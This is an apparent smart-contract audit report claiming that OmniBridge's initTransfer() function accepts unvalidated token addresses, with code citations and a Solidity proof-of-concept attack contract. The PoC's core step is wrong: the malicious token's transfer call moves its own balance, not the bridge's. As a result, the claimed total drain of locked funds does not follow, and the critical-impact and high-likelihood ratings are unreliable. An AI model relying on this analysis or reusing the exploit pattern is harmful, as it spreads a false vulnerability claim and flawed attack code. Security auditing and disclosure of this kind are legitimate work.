### Title
Unvalidated `tokenAddress` in `initTransfer()` Allows Malicious Token to Drain All Locked ERC20 Funds from `OmniBridge` - (File: evm/src/omni-bridge/contracts/OmniBridge.sol)

---

### Summary

`OmniBridge.initTransfer()` accepts a caller-supplied `tokenAddress` with no whitelist or legitimacy check. For any address that is neither a registered bridge token nor a custom minter, the function unconditionally calls `IERC20(tokenAddress).safeTransferFrom(msg.sender, address(this), amount)`. A malicious contract at `tokenAddress` can implement `transferFrom` to drain every real ERC20 token held by the bridge, then return `true` so the `SafeERC20` wrapper does not revert. There is no reentrancy guard on the function.

---

### Finding Description

`OmniBridge` accumulates real ERC20 tokens (USDC, WETH, etc.) as users lock assets for cross-chain transfer. The `initTransfer` function is publicly callable and takes a raw `address tokenAddress` parameter:

```solidity
function initTransfer(
    address tokenAddress,
    uint128 amount,
    ...
) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
    ...
    } else {
        IERC20(tokenAddress).safeTransferFrom(   // ← user-controlled external call
            msg.sender,
            address(this),
            amount
        );
    }
``` [1](#0-0) 

The only guards applied before reaching the `safeTransferFrom` call are:
- `fee >= amount` → revert
- `customMinters[tokenAddress] != address(0)` → different branch
- `isBridgeToken[tokenAddress]` → different branch

Neither `customMinters` nor `isBridgeToken` is set for an attacker-deployed address, so execution falls through to the unguarded `else` branch. No reentrancy guard (`ReentrancyGuard` / `nonReentrant`) is present anywhere in the contract. [2](#0-1) 

The same structural flaw exists in the Starknet bridge:

```cairo
} else {
    let success = IERC20Dispatcher { contract_address: token_address }
        .transfer_from(caller, get_contract_address(), amount.into());
    assert(success, 'ERR_TRANSFER_FROM_FAILED');
}
``` [3](#0-2) 

---

### Impact Explanation

The bridge contract holds real ERC20 tokens locked by legitimate users. A single call to `initTransfer` with a malicious `tokenAddress` can drain the entire ERC20 balance of any token held by the bridge. This is a direct, complete theft of bridged user funds — matching the "stealing or permanent loss of bridged funds" critical impact category.

---

### Likelihood Explanation

The function is public, requires no privileged role, and is callable by any EOA or contract. The attacker needs only to deploy a malicious ERC20 contract (trivial) and call `initTransfer` once. No front-running, no collusion, no special timing is required. Likelihood is high.

---

### Recommendation

Maintain an explicit token whitelist (analogous to `isBridgeToken` / `nearToEthToken`) and reject any `tokenAddress` not present in it inside `initTransfer`. Alternatively, validate that `ethToNearToken[tokenAddress]` is non-empty before proceeding. Additionally, add a `ReentrancyGuard` (`nonReentrant` modifier) to `initTransfer` and `initTransfer1155` as defense-in-depth.

---

### Proof of Concept

```solidity
// Malicious token deployed by attacker
contract MaliciousToken {
    IERC20 public target; // e.g. USDC held by OmniBridge

    constructor(address _target) { target = IERC20(_target); }

    // Called by OmniBridge via safeTransferFrom
    function transferFrom(address, address, uint256) external returns (bool) {
        // Drain all USDC from OmniBridge to attacker
        target.transfer(msg.sender /* attacker */, target.balanceOf(msg.sender /* bridge */));
        // Note: msg.sender here is OmniBridge; attacker passes bridge address
        return true;
    }

    function allowance(address, address) external pure returns (uint256) { return type(uint256).max; }
}

// Attack
MaliciousToken mal = new MaliciousToken(address(USDC));
// OmniBridge calls mal.transferFrom(attacker, bridge, 1)
// Inside transferFrom, USDC.transfer(attacker, USDC.balanceOf(bridge)) executes
omniBridge.initTransfer(
    address(mal),
    1,      // amount (irrelevant)
    0,      // fee
    0,      // nativeFee
    "attacker.near",
    ""
);
// All USDC previously locked in OmniBridge is now in attacker's wallet.
``` [4](#0-3)

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L373-412)
```text
    function initTransfer(
        address tokenAddress,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        uint256 extensionValue;
        if (tokenAddress == address(0)) {
            if (fee != 0) {
                revert InvalidFee();
            }
            extensionValue = msg.value - amount - nativeFee;
        } else {
            extensionValue = msg.value - nativeFee;
            if (customMinters[tokenAddress] != address(0)) {
                IERC20(tokenAddress).safeTransferFrom(
                    msg.sender,
                    customMinters[tokenAddress],
                    amount
                );
                ICustomMinter(customMinters[tokenAddress]).burn(
                    tokenAddress,
                    amount
                );
            } else if (isBridgeToken[tokenAddress]) {
                BridgeToken(tokenAddress).burn(msg.sender, amount);
            } else {
                IERC20(tokenAddress).safeTransferFrom(
                    msg.sender,
                    address(this),
                    amount
                );
            }
```

**File:** starknet/src/omni_bridge.cairo (L303-307)
```text
            } else {
                let success = IERC20Dispatcher { contract_address: token_address }
                    .transfer_from(caller, get_contract_address(), amount.into());
                assert(success, 'ERR_TRANSFER_FROM_FAILED');
            }
```
